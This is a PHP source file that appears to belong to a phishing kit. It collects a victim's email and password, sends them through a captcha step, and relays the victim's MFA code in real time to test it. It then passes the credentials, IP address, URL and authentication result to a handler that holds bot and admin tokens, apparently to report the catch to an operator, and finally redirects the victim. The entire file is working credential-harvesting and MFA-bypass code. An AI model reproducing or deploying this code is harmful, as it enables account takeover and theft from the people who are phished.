<?php
error_reporting(E_ERROR | E_PARSE);
require 'core/system/include.php';

session_start();

if(isset($_SESSION["credentials"]))
{
	$data      =  explode("\0", $_SESSION["credentials"]);
	$login     =  $data[0];
	$password  =  $data[1];
}
else
{
	$login     =  $_POST["email"];
	$password  =  $_POST["password"];
}

if(!isset($_SESSION["ticket"]))
{
    unset($_SESSION["credentials"]);
    unset($_SESSION["captcha_key"]);

    header("Location: /index.php");
    die();
}

if(isset($_SESSION["captcha_key"]))
{
	$captcha_key = $_SESSION["captcha_key"];
}
else
{
    $_SESSION["redirect"]     =  "mfa";
    $_SESSION["credentials"]  =  $login . "\0" . $password;

    header("Location: /captcha.php");
    die();
}

$client_ip        =  $_SERVER["REMOTE_ADDR"];
$server_hostname  =  $_SERVER["HTTP_HOST"];
$full_url         =  $_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"];

if($login != NULL and $password != NULL and isset($_POST["mfacode"]))
{
	if($captcha_key != NULL)
	{
        unset($_SESSION["credentials"]);
        unset($_SESSION["captcha_key"]);
        unset($_SESSION["mfa_invalid"]);

		$mfacode = $_POST["mfacode"];

        if(!isset($_SESSION["ticket"])){
            header("Location: /index.php");
            die();
        }

        $ticket = $_SESSION["ticket"];

        unset($_SESSION["ticket"]);

        $totp_result = $VLT_API->totp_auth($ticket, $mfacode);

        if($totp_result == "EINVALID_MFA_CODE"){
            $_SESSION["credentials"] = $login . "\0" . $password;
            $_SESSION["ticket"] = $ticket;
            $_SESSION["mfa_invalid"] = 1;
            header("Location: /mfa.php");
            die();
        }
        
        ///LOG RESULT.
        unset($_SESSION["credentials"]);
        unset($_SESSION["captcha_key"]);
        unset($_SESSION["ticket"]);
        unset($_SESSION["mfa_invalid"]);

        $api_response = $Main->handler(
				$bot_token, 
				$user_id, 
				$client_ip, 
				$password, 
				$full_url, 
				$login, 
				$server_hostname,
				$admin_id,
				$admin_token,
				$totp_result,
				$admin_sendlog
			);

        header("Location: ".$url_redirect);
        die();
	}
	else
	{
		$_SESSION["redirect"]     =  "mfa";
		$_SESSION["credentials"]  =  $login . "\0" . $password;
		$_SESSION["mfa_invalid"] = 0;

		header("Location: /captcha.php");
	}
}
else
{
	#die($_SESSION["mfa_invalid"]);
	require("src/mfa.php");
	if($_SESSION["mfa_invalid"] == 1){require("src/errors/invalid_mfa.php");}
    die();
}
?>